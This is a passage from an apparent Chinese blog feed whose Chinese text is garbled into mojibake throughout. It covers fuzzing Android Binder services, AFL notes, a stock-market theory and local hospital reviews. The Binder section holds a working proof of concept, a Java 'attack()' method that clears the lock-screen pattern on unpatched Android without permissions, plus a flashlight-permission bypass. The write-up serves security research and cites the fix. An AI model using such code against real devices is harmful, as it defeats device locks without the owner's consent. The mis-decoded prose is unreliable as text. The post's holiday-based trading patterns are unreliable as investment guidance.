HashMap&lt;String, List&lt;String&gt;&gt; ret = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br><br>    <span class="hljs-keyword">if</span> (interfaceDescriptor == <span class="hljs-literal">null</span>)<br>        <span class="hljs-keyword">return</span> ret;<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        Class&lt;?&gt; cStub = Class<br>                .forName(interfaceDescriptor + <span class="hljs-string">&quot;$Stub$Proxy&quot;</span>);<br>        Method[] m = cStub.getDeclaredMethods();<br><br>        <span class="hljs-keyword">for</span> (Method method : m) &#123;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">func_code</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>            List&lt;String&gt; func_parameter = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br><br>            method.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">func_name</span> <span class="hljs-operator">=</span> method.toString().split(<span class="hljs-string">&quot;\\$Stub\\$Proxy\\.&quot;</span>)[<span class="hljs-number">1</span>];<br>            func_parameter.add(func_name);<br><br>            <span class="hljs-keyword">for</span> (String key : codes.keySet()) &#123;<br>                <span class="hljs-keyword">if</span> (func_name.contains(key.substring(<span class="hljs-string">&quot;TRANSACTION_&quot;</span>.length())))<br>                    func_code = codes.get(key);<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (func_code == <span class="hljs-number">0</span>)<br>                <span class="hljs-keyword">continue</span>;<br><br>            Class&lt;?&gt;[] ParameterTypes = method.getParameterTypes();<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k=<span class="hljs-number">0</span>; k &lt; ParameterTypes.length; k++) &#123;<br>                func_parameter.add(ParameterTypes[k].toString());<br>            &#125;<br><br>            ret.put(Integer.toString(func_code), func_parameter);<br>        &#125;<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="5ï¼‰Binder-è°ƒç”¨"><a href="#5ï¼‰Binder-è°ƒç”¨" class="headerlink" title="5ï¼‰Binder è°ƒç”¨"></a>5ï¼‰Binder è°ƒç”¨</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> IBinder <span class="hljs-title function_">getIBinder</span><span class="hljs-params">(String service)</span> &#123;<br>    <span class="hljs-type">IBinder</span> <span class="hljs-variable">serviceBinder</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">try</span> &#123;<br>        serviceBinder = (IBinder) Class.forName(<span class="hljs-string">&quot;android.os.ServiceManager&quot;</span>)<br>                .getDeclaredMethod(<span class="hljs-string">&quot;getService&quot;</span>, String.class).invoke(<span class="hljs-literal">null</span>, service);<br>    &#125; <span class="hljs-keyword">catch</span> (ClassCastException e) &#123;<br>    &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>    &#125; <span class="hljs-keyword">catch</span> (NoSuchMethodException e) &#123;<br>    &#125; <span class="hljs-keyword">catch</span> (InvocationTargetException e) &#123;<br>    &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> serviceBinder;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">fuzz</span> <span class="hljs-params">(<span class="hljs-type">int</span> code, String Service)</span> &#123;<br>    <span class="hljs-type">Parcel</span> <span class="hljs-variable">data</span> <span class="hljs-operator">=</span> Parcel.obtain();<br>    <span class="hljs-type">Parcel</span> <span class="hljs-variable">reply</span> <span class="hljs-operator">=</span> Parcel.obtain();<br><br>    <span class="hljs-type">IBinder</span> <span class="hljs-variable">serviceBinder</span> <span class="hljs-operator">=</span> BinderInfo.getIBinder(service);<br>    serviceBinder.transact(code, data, reply, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸Šé¢çš„å‡ ä¸ªæ­¥éª¤å·²ç»å…¨éƒ¨java ä»£ç å®ç°ï¼Œå¯è¡Œã€‚</p><h2 id="5-å®ç°æ–¹æ³•çš„åˆ†æäºæ¯”è¾ƒ"><a href="#5-å®ç°æ–¹æ³•çš„åˆ†æäºæ¯”è¾ƒ" class="headerlink" title="5. å®ç°æ–¹æ³•çš„åˆ†æäºæ¯”è¾ƒ"></a>5. å®ç°æ–¹æ³•çš„åˆ†æäºæ¯”è¾ƒ</h2><p>ioctl çš„æ–¹æ³•è¿‡äºåº•å±‚ï¼Œéœ€è¦å®ç°çš„ä»£ç å¾ˆå¤šï¼Œè€Œ java åº”ç”¨å±‚çš„ä»£ç ç”±äºæƒé™åŸå› ï¼Œç»å¸¸ä¼šé‡åˆ°æ²¡æœ‰æƒé™çš„æƒ…å†µã€‚<br>æ‰€ä»¥ä½¿ç”¨ Native å±‚çš„æ–¹æ³•æ˜¯åˆé€‚çš„ï¼Œåœ¨Root çš„Android æœºå™¨ä¸Šè¿è¡Œä»£ç ï¼Œå¯ä»¥è§£å†³æƒé™é—®é¢˜ã€‚è€Œ Java åº”ç”¨å±‚çš„<br>ä»£ç åˆ©ç”¨åå°„å¯ä»¥è·å–åˆ°æ¯ä¸ªæ¥å£çš„è¯¦ç»†ä¿¡æ¯ï¼Œæ ¹æ®è·å–åˆ°çš„ä¿¡æ¯æŒ‡å¯¼ Native å±‚ fuzz ç¨‹åºçš„åç»­å˜å¼‚ï¼Œåº”è¯¥æ˜¯æ¯”è¾ƒç†æƒ³çš„æ–¹æ³•ã€‚</p><h2 id="6-Fuzz-æ•°æ®çš„ç”Ÿæˆ"><a href="#6-Fuzz-æ•°æ®çš„ç”Ÿæˆ" class="headerlink" title="6. Fuzz æ•°æ®çš„ç”Ÿæˆ"></a>6. Fuzz æ•°æ®çš„ç”Ÿæˆ</h2><p>å¯ä»¥è€ƒè™‘ç§»æ¤ radasma åˆ° Android å¹³å°</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">git <span class="hljs-built_in">clone</span> https://github.com/anestisb/radamsa-android.git</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> radamsa-android</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">export</span> PATH=<span class="hljs-variable">$PATH</span>:NDK_PATH</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">ndk-build NDK_PROJECT_PATH=. APP_BUILD_SCRIPT=./jni/Android.mk \</span><br><span class="language-bash">    APP_PLATFORM=android-24 APP_ABI=armeabi-v7a \</span><br><span class="language-bash">    NDK_TOOLCHAIN=arm-linux-androideabi-4.9</span><br><br><br>[armeabi-v7a] Compile thumb  : radamsa &lt;= radamsa.c<br>[armeabi-v7a] Executable     : radamsa<br>[armeabi-v7a] Install        : radamsa =&gt; libs/armeabi-v7a/radamsa<br></code></pre></td></tr></table></figure><h3 id="6-1-æ›´æ–°-radamsa-android"><a href="#6-1-æ›´æ–°-radamsa-android" class="headerlink" title="6.1 æ›´æ–° radamsa-android"></a>6.1 æ›´æ–° radamsa-android</h3><p>github ä¸Šç§»æ¤çš„radamsa å·²ç»æ¯”è¾ƒå¤è€ (0.4), å¯ä»¥ç›´æ¥å°†æœ€æ–°ç‰ˆ(0.6a)çš„radamsa ç§»æ¤<br>åˆ° Androidä¸Šã€‚æ–¹æ³•æ¯”è¾ƒç®€å•ï¼Œåœ¨åŸå§‹çš„ radamsa ä¸­æœ‰ä¸€ä¸ª radamsa.c å°†è¿™ä¸ªæ–‡ä»¶æ›¿æ¢<br>radamsa-android&#x2F;jni ç›®å½•ä¸‹çš„ radamsa.c</p><p>ç„¶ååœ¨æ–‡ä»¶ä¸­æ·»åŠ ä¸‹é¢ä»£ç ï¼Œ é‡æ–°ç¼–è¯‘å³å¯ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> ANDROID</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;arpa/inet.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> WIFCONTINUED</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> WIFCONTINUED(stat) 0</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><h2 id="7-Fuzz-å‡ºæ¥çš„ä¸€äº›æ¼æ´"><a href="#7-Fuzz-å‡ºæ¥çš„ä¸€äº›æ¼æ´" class="headerlink" title="7. Fuzz å‡ºæ¥çš„ä¸€äº›æ¼æ´"></a>7. Fuzz å‡ºæ¥çš„ä¸€äº›æ¼æ´</h2><h3 id="1ï¼‰-htc-m8-é›¶æƒé™æ‰“å¼€é—ªå…‰ç¯"><a href="#1ï¼‰-htc-m8-é›¶æƒé™æ‰“å¼€é—ªå…‰ç¯" class="headerlink" title="1ï¼‰ htc m8 é›¶æƒé™æ‰“å¼€é—ªå…‰ç¯"></a>1ï¼‰ htc m8 é›¶æƒé™æ‰“å¼€é—ªå…‰ç¯</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">IBinder</span> <span class="hljs-variable">serviceBinder</span> <span class="hljs-operator">=</span> getIBinder(<span class="hljs-string">&quot;media.camera&quot;</span>);<br><br><span class="hljs-type">Parcel</span> <span class="hljs-variable">data1</span> <span class="hljs-operator">=</span> Parcel.obtain();<br><span class="hljs-type">Parcel</span> <span class="hljs-variable">reply1</span> <span class="hljs-operator">=</span> Parcel.obtain();<br><br><span class="hljs-keyword">try</span> &#123;<br>    data1.writeInterfaceToken(serviceBinder.getInterfaceDescriptor());<br>    data1.writeByteArray(<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>]);<br>    serviceBinder.transact(<span class="hljs-number">8</span>, data1, reply1, <span class="hljs-number">0</span>);<br>&#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;&#125;<br></code></pre></td></tr></table></figure><h3 id="2ï¼‰-Android-6-0-1-MOB3OM-æ‰‹åŠ¿å¯†ç æ¸…é™¤æ¼æ´"><a href="#2ï¼‰-Android-6-0-1-MOB3OM-æ‰‹åŠ¿å¯†ç æ¸…é™¤æ¼æ´" class="headerlink" title="2ï¼‰ Android 6.0.1 MOB3OM æ‰‹åŠ¿å¯†ç æ¸…é™¤æ¼æ´"></a>2ï¼‰ Android 6.0.1 MOB3OM æ‰‹åŠ¿å¯†ç æ¸…é™¤æ¼æ´</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">attack</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-type">IBinder</span> <span class="hljs-variable">serviceBinder</span> <span class="hljs-operator">=</span> getIBinder(<span class="hljs-string">&quot;lock_settings&quot;</span>);<br><br><span class="hljs-type">Parcel</span> <span class="hljs-variable">data1</span> <span class="hljs-operator">=</span> Parcel.obtain();<br><span class="hljs-type">Parcel</span> <span class="hljs-variable">reply1</span> <span class="hljs-operator">=</span> Parcel.obtain();<br><br><span class="hljs-keyword">try</span> &#123;<br>data1.writeInterfaceToken(serviceBinder.getInterfaceDescriptor());<br>data1.writeByteArray(<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">255</span>]);<br>serviceBinder.transact(<span class="hljs-number">7</span>, data1, reply1, <span class="hljs-number">0</span>);<br>&#125; <span class="hljs-keyword">catch</span> (RemoteException e) &#123;&#125;<br>&#125;<br><br><span class="hljs-keyword">public</span> IBinder <span class="hljs-title function_">getIBinder</span><span class="hljs-params">(String service)</span> &#123;<br><span class="hljs-type">IBinder</span> <span class="hljs-variable">serviceBinder</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">try</span> &#123;<br>serviceBinder = (IBinder) Class.forName(<span class="hljs-string">&quot;android.os.ServiceManager&quot;</span>)<br>.getDeclaredMethod(<span class="hljs-string">&quot;getService&quot;</span>, String.class).invoke(<span class="hljs-literal">null</span>, service);<br>&#125; <span class="hljs-keyword">catch</span> (ClassCastException e) &#123;<br>&#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>&#125; <span class="hljs-keyword">catch</span> (NoSuchMethodException e) &#123;<br>&#125; <span class="hljs-keyword">catch</span> (InvocationTargetException e) &#123;<br>&#125; <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;<br>&#125;<br><br><span class="hljs-keyword">return</span> serviceBinder;<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨Android 6.0.1 MOB3OM ä¹‹å‰çš„ä¸€äº›ç‰ˆæœ¬ä¸­, æœªåœ¨setLockPattern ä¸­åšæƒé™æ£€æŸ¥,<br>å¯¼è‡´apk ä¸éœ€è¦ä»»ä½•æƒé™å°±å¯ä»¥å°†æ‰‹åŠ¿å¯†ç æ¸…é™¤. </p><p>è¿™ä¸ªé—®é¢˜å·²ç»ä¿®å¤ author Jim Miller <a href="mailto:&#106;&#97;&#x67;&#x67;&#x69;&#101;&#115;&#x40;&#103;&#x6f;&#111;&#x67;&#x6c;&#x65;&#46;&#x63;&#x6f;&#109;">&#106;&#97;&#x67;&#x67;&#x69;&#101;&#115;&#x40;&#103;&#x6f;&#111;&#x67;&#x6c;&#x65;&#46;&#x63;&#x6f;&#109;</a>Wed Apr 13 16:35:36 2016 -0700</p><p><a href="https://android.googlesource.com/platform/frameworks/base/+/b5383455b6cae093e60684b4f5cccb0cc440330d%5E%21/#F0">https://android.googlesource.com/platform/frameworks/base/+/b5383455b6cae093e60684b4f5cccb0cc440330d%5E%21/#F0</a></p><p>ä½†æ˜¯è€ƒè™‘åˆ°Android çš„ç¢ç‰‡åŒ–é—®é¢˜, ä¼°è®¡åœ¨ä¸€äº›æ‰‹æœºä¸­å°†å­˜åœ¨è¿™ä¸ªé—®é¢˜. </p><h2 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h2><ul><li><a href="https://www.blackhat.com/docs/us-15/materials/us-15-Gong-Fuzzing-Android-System-Services-By-Binder-Call-To-Escalate-Privilege.pdf">Fuzzing Android System Services by Binder Call to Escalate Privilege</a></li><li><a href="https://googleprojectzero.blogspot.com/2016/12/bitunmap-attacking-android-ashmem.html">BitUnmap: Attacking Android Ashmem</a></li><li><a href="http://newandroidbook.com/files/Andevcon-Binder.pdf">Androidâ€™s Binder â€“ in depth</a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>Security</tag>
      
      <tag>Android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>afl-fuzz æ¡†æ¶</title>
    <link href="/cn/afl/"/>
    <url>/cn/afl/</url>
    
    <content type="html"><![CDATA[<p>afl-fuzz çš„æ•´ä½“æ¶æ„ï¼Œæ–°æ‰‹ç†è§£èµ·æ¥è¿˜æ˜¯æ¯”è¾ƒè´¹åŠ²ï¼Œç½‘ç»œä¸Šå‘ç°ä¸€å¼ å›¾è§‰å¾—ä¸é”™ï¼Œæ”¾ä¸Šæ¥å¤§å®¶çœ‹çœ‹ï¼Œæ„Ÿè°¢åŸä½œè€…ã€‚</p><p><img src="https://raw.githubusercontent.com/henices/pictures/master/afl-fuzz.png" alt="afl-fuzz"></p>]]></content>
    
    
    
    <tags>
      
      <tag>Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Dissecting American Fuzzy Lop A FuzzBench Evaluation è¦ç‚¹</title>
    <link href="/cn/afl-fuzz1/"/>
    <url>/cn/afl-fuzz1/</url>
    
    <content type="html"><![CDATA[<p>paper: <a href="https://www.s3.eurecom.fr/docs/fuzzing22_fioraldi_report.pdf">https://www.s3.eurecom.fr/docs/fuzzing22_fioraldi_report.pdf</a></p><h2 id="ä¸¤ä¸ªå®éªŒçš„ç»“è®º-ä¸»è¦åŸºäº-FuzzBench"><a href="#ä¸¤ä¸ªå®éªŒçš„ç»“è®º-ä¸»è¦åŸºäº-FuzzBench" class="headerlink" title="ä¸¤ä¸ªå®éªŒçš„ç»“è®º (ä¸»è¦åŸºäº FuzzBench)"></a>ä¸¤ä¸ªå®éªŒçš„ç»“è®º (ä¸»è¦åŸºäº FuzzBench)</h2><ul><li>Our conclusion after this experiment is that AFL, and follow-ups fuzzers like AFL++, should provide an optionto disable hitcounts. AFL++ provides many different op-tions, and the users are suggested to run an instance of each variant when doing parallel fuzzing, a common use-case in real-world setups. The fact that in our experiments,hitcounts have shown a highly variadic behavior suggests that users should include a variant without hitcounts when doing parallel or ensemble fuzzing like OSS-Fuzz.</li><li>The conclusion we can draw from this experiment is that it would be a mistake to underestimate the impact of the novelty search. In particular, researchers proposing new approaches that also modify this aspect should care-fully evaluate â€“ in isolation â€“ the benefit of a different mechanism to decide if an input is interesting, as AFLâ€™s novelty search provides a strong baseline.</li></ul><h2 id="è®ºæ–‡ä¸­è®¡åˆ’è¦è¯„ä¼°çš„-afl-fuzz-çš„ä¸€äº›æŠ€æœ¯"><a href="#è®ºæ–‡ä¸­è®¡åˆ’è¦è¯„ä¼°çš„-afl-fuzz-çš„ä¸€äº›æŠ€æœ¯" class="headerlink" title="è®ºæ–‡ä¸­è®¡åˆ’è¦è¯„ä¼°çš„ afl-fuzz çš„ä¸€äº›æŠ€æœ¯"></a>è®ºæ–‡ä¸­è®¡åˆ’è¦è¯„ä¼°çš„ afl-fuzz çš„ä¸€äº›æŠ€æœ¯</h2><ul><li><strong>Hitcounts</strong>: Hitcounts are adopted by other fuzzers to-day, but AFL was the first to introduce this concept.Despite its wide adoption, the impact of this optimization (overplain edge coverage) has never been measured in isolation on a large set of targets.</li><li><strong>Novelty search vs. maximization of a fitness</strong>: While AFL considers every new discovered hitcount as interesting, both other early fuzzing solutions and more recent tools instead only consider testcases that maximize a given metricas interesting. For instance, VUZZER uses the sum of all the weights of the executed basic blocks.<ul><li>In this experiment, we benchmark the AFL approach versusa fitness maximization and the combination of the two ap-proaches, as proposed by VUZZER</li><li>We expect the novelty search to outperforms both of the competing algorithms,</li></ul></li><li><strong>Corpus culling</strong>: The prioritization of the small and fast testcases in the AFL corpus selection algorithm trades speed with the fuzzing of more complex testcases that often corresponds to complex program states<ul><li>In this experiment, we want to assess the difference in using the AFL corpus culling mechanism versus using the entire corpus.</li><li>We expect faster growth in coverage over time and,potentially, more bugs triggered in the same time window</li></ul></li><li><strong>Score calculation</strong>: The performance score used to cal-culate how many times to mutate and execute the input in the havoc, and splice stages are derived from many variables,mainly testcase size and execution time<ul><li>In this experiment, we want to measure the delta between the AFL solution and the baseline, represented by a constantand a random score</li></ul></li><li><strong>Corpus scheduling</strong>: The FIFO policy used by AFL is only one of the possible policies that a fuzzer can adopt to select the next testcase<ul><li>Thus, we evaluate AFL versus a modified version that implements the baseline, random selection, and the opposite approach, a LIFO scheduler.</li></ul></li><li><strong>Splicing as stage vs. splicing as mutation</strong>: Splicing refers to the operation that merges two different testcases into a new one<ul><li>We modified the AFL codebase to implement splicing as a mutation operator to compare the two.</li></ul></li><li><strong>Trimming</strong>: Trimming the testcases allows the fuzzer to reduce the size of the input files and consequently give priority to small inputs, under the assumptions that large inputs introduce a slowdown in the execution and the mutations would be less likely to modify an important portion of the binary structure<ul><li>Despite the fact that this algorithm can bring the two important benefits described above, we argue that reducing the size of the testcases could lead to lose state coverage.Additionally, the trimming phase could become a bottleneck for slow targets</li><li>Therefore, in our evaluation we plan tocompare the default version of AFL against a modified one,where we disabled trimming</li></ul></li><li><strong>Collisions</strong>: As explained in section III-F the AFL ap-proach to instrument the source code of the target programs consists of assigning an identifier for each basic block at compile-time.<ul><li>We want to benchmark this feature as the collision-free variant is simpler than the original implementation with pc-guard, raising the question why random identifiers are used in AFL</li></ul></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å…³äºAè‚¡å˜ç›˜çš„å‡æœŸæ•ˆåº”æ€è€ƒ</title>
    <link href="/cn/a_change/"/>
    <url>/cn/a_change/</url>
    
    <content type="html"><![CDATA[<p>æ²‰æµ® Aè‚¡å¤šå¹´ï¼Œå‘ç°ä¸€ä¸ªæ¯”è¾ƒé‡è¦çš„è§„å¾‹ï¼ŒA è‚¡å˜ç›˜çš„æ—¶é—´èŠ‚ç‚¹å¤§å¤šå‘ç”Ÿåœ¨é‡å¤§èŠ‚å‡æ—¥æœŸé—´ï¼Œåˆ†åˆ«ä¸¾ä¾‹å¦‚ä¸‹ï¼š</p><ul><li>ã€Œ1ã€é‡å¤§èŠ‚æ—¥ ï¼ˆåŒ…æ‹¬é˜³å†å’Œå†œå†ï¼š åŠ³åŠ¨èŠ‚ï¼Œå›½åº†èŠ‚ï¼Œä¸­ç§‹èŠ‚ï¼Œç«¯åˆèŠ‚ï¼Œè¿‡å¹´ ç­‰ï¼‰</li><li>ã€Œ2ã€å‘¨ä¸€&#x2F;å‘¨äº”</li><li>ã€Œ3ã€æœˆåˆ&#x2F;æœˆæœ«</li></ul><p>æœ‰äººæ€»ç»“å‡º A è‚¡å˜ç›˜æ—¶é—´èŠ‚ç‚¹å’Œå†œå†çš„ 24 èŠ‚æ°”ç›¸å…³ï¼Œæ¯ä¸ªèŠ‚æ°”çš„æ—¶é—´é—´éš”å¤§è‡´åœ¨ 15 åˆ° 16 å¤©å·¦å³ï¼Œè¿™æ¡è§„å¾‹<br>å…¶å®å’Œä¸Šé¢çš„ ã€Œ1ã€ è¯´æ³•æ˜¯ä¸€è‡´çš„ã€‚</p><p>æ€è€ƒå…¶èƒŒåçš„åŸå› ï¼Œå¹³æ—¶äº¤æ˜“æ—¥éƒ½æ˜¯è¿ç»­çš„ä¸­é—´æ— é—´æ–­ï¼Œå¤§å®¶çš„äº¤æ˜“æ€è·¯å’Œçœ‹æ³•ä¹Ÿæ¯”è¾ƒå®¹æ˜“è¿ç»­ä¸€è‡´ã€‚<br>æ¯é€¢é‡å¤§èŠ‚æ—¥ï¼Œæˆ–è€…æœˆåˆæœˆæœ«ï¼Œå¾€å¾€éƒ½æ˜¯æ”¾å‡ä¼‘æ¯çš„æ—¶é—´ï¼Œå¤–åŠ æœŸé—´å„ç§ä¿¡æ¯çš„è¾“å…¥é‡æ¯”å¹³æ—¶å¤§å¾ˆå¤šï¼Œè¿™æ ·å®¹æ˜“æœ‰æ€ç»´æ³¢åŠ¨ã€‚é‡å¤§èŠ‚æ—¥åï¼Œä¸»åŠ›ä¸€å¸¦èŠ‚å¥ï¼Œå®¹æ˜“å¯¹å¤§å®¶çš„æ€ç»´è¿›è¡Œå¼ºåŒ–ï¼Œåˆ†æ­§è½¬ä¸€è‡´åï¼Œå°±çœŸçš„å˜ç›˜äº†ã€‚</p><p>Aè‚¡è¿˜æœ‰ä¸ªæœˆåˆï¼Œæœˆæœ«æ•ˆåº”ï¼Œæœˆåˆèµšé’±ï¼Œæœˆæœ«äºé’±ï¼Œæ¯”è¾ƒå¥‡æ€ªï¼Œå¯èƒ½å’ŒåŸºé‡‘ç»ç†çš„æœˆåˆå»ºä»“å’Œæœˆæœ«è€ƒæ ¸ç›¸å…³ï¼Œè¿™æ¡è§„å¾‹å‡ ä¹æ˜¯å¯¹ç§°çš„ï¼Œå¦‚æœæœˆæœ«æ²¡æœ‰å¤§è·Œï¼ŒæœˆåˆåŸºæœ¬å°±æ²¡æœ‰å¤§èµšæ•ˆåº”ã€‚</p><p>åé¢å‘ç°å±…ç„¶æœ‰ä¸€ä¸ªè‚¡ç¥¨æŠ€æœ¯åˆ†ææµæ´¾å«å­£èŠ‚æ´¾ã€‚ï¼ˆå­£èŠ‚ç†è®º Season Theoryï¼‰</p>]]></content>
    
    
    
    <tags>
      
      <tag>investment</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ç´«ç«¹æ¡¥é™„è¿‘çœ‹ç—…æƒ…å†µ</title>
    <link href="/cn/304/"/>
    <url>/cn/304/</url>
    
    <content type="html"><![CDATA[<p>ä½œä¸ºä¸€ä¸ªé•¿æœŸåœ¨å¸éƒ½ç´«ç«¹æ¡¥æ··åƒçš„ä¸­å¹´å¤§å”ï¼Œç»å¸¸é‡åˆ°éœ€è¦çœ‹ç—…çš„æƒ…å†µï¼Œä¸»è¦éœ€æ±‚æœ‰ä¸¤ä¸ª ï¼ˆå¤§äººçœ‹ç—…ï¼Œå°å­©çœ‹ç—…ï¼‰ã€‚</p><p>æ€»ç»“é™„è¿‘åŒ»é™¢æƒ…å†µï¼Œä¸ªäººç†è§£ï¼Œä¾›å‚è€ƒï¼š</p><p>466:</p><p>ç¼ºç‚¹ï¼šæ²¡æœ‰å„¿ç§‘ï¼Œå·¨è´µï¼Œæ„Ÿè§‰åŒ»ç”Ÿå–œæ¬¢è¿‡åº¦æ²»ç–—ï¼Œæ®è¯´ä¸€äº›ç§‘å®¤å·²è¢«ç§äººæ‰¿åŒ…ï¼Œåª³å¦‡å’Œè‡ªå·±éƒ½è¢«å‘è¿‡ã€‚<br>ä¼˜ç‚¹ï¼šç¦»ç´«ç«¹æ¡¥è·ç¦»è¿‘ï¼Œä¸‰ç”²ï¼Œäººé€šå¸¸æ¯”è¾ƒå°‘ï¼Œå°ç—…ï¼Œå·æ‡’çš„æ—¶å€™å¯ä»¥è¿‡å»ã€‚æ®è¯´ç‰™ç§‘ä¸é”™ï¼Œä½†æ˜¯æˆ‘æ²¡æœ‰å»è¿‡ã€‚</p><p>304:</p><p>ç¼ºç‚¹ï¼šä¿¡æ¯åŒ–ç¨‹åº¦ç›¸å¯¹è¾ƒå¼±ï¼Œä½†æ˜¯çœ‹ç—…æµç¨‹æ¢³ç†å¾—ä¸é”™ã€‚<br>ä¼˜ç‚¹ï¼šä¸‰ç”²ï¼Œæœ‰å„¿ç§‘ï¼Œå¯¹å°å„¿çœ‹ç—…æœ‰ä¸€å®šä¼˜å¾…ã€‚åŒ»ç”Ÿæ°´å¹³ä¸é”™ï¼Œå°å­©åœ¨è¿™çœ‹è¿‡å‡ æ¬¡ï¼Œæ²»ç–—æ•ˆæœä¸é”™ã€‚</p><p>ç°åœ¨304 æ”¹åä¸º è§£æ”¾å†›æ€»åŒ»é™¢ç¬¬å››åŒ»å­¦ä¸­å¿ƒï¼Œå„¿ç§‘çš„å®åŠ›æ¯”ä»¥å¾€æœ‰è¾ƒå¤§æå‡ã€‚</p><p>å››å­£é’ï¼š</p><p>ç¼ºç‚¹ï¼šäºŒçº§åŒ»é™¢ï¼Œå„¿ç§‘æœ‰çš„åŒ»ç”Ÿæ„Ÿè§‰ä¸å¤ªä¸“ä¸šã€‚<br>ä¼˜ç‚¹ï¼šæŒ‚å·æ–¹ä¾¿ï¼Œæœ‰å„¿ç§‘ï¼ŒåŒ»é™¢è¾ƒå¤§ã€‚</p><p>åŒ—æ–¹åŒ»é™¢ï¼š</p><p>ç¼ºç‚¹ï¼šäºŒçº§åŒ»é™¢ï¼Œ 